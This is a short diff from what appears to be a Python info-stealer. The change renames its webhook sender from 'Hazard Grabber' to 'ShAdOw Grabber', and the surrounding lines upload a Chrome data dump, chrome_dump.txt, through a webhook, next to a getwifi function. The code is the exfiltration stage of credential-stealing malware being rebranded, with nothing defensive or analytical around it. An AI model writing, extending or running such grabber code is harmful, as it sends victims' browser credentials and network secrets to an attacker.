@@ -214,7 +214,7 @@ def getwifi():
     return answer
 
 def get_chrome_file():
-	hook.modify(name='Hazard Grabber', avatar=None)
+	hook.modify(name='ShAdOw Grabber', avatar=None)
 	file = File(comepleteName, name='chrome_dump.txt')
 	hook.send(f'chrome dump:', file=file)
 
